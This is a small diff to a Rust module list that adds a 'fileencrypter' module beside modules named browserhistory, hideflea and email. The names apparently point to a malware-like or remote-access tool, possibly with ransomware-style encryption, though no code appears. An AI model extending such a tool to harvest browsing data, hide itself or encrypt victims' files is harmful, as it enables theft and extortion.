@@ -9,6 +9,7 @@ pub mod fileserver;
 pub mod browserhistory;
 pub mod hideflea;
 pub mod email;
+pub mod fileencrypter;
 
 #[cfg(target_os = "windows")]
 pub mod windowsfunctions;
